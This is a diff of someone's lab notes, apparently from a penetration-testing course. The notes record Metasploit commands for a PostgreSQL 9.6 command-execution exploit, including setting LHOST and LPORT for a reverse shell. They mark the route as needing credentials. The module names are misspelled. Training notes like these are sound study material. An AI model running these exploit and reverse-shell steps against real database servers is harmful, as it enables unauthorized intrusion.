@@ -22,10 +22,11 @@ Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0
 (ATK)(msf6)> use 0 because its a expliot module 
 
 use exploit modules as much as possible.
-
 LHOST comming back through our WAN
 
+
 [SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]
+
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
 
@@ -35,15 +36,19 @@ LHOST comming back through our WAN
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]
 
-[Found out that you need creds for this route hard stop]
+
+
+[HARD STOP found out that you need creds for this route ]
+
+Config start around [1:48] [DAY 11]
 
 (CALI) searchsploit postgresql (find version) 
 
 (ATK)(msf6) search postgresql
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209 [3:29][DAY 11]
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.102 [3:29][DAY 11]
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
 
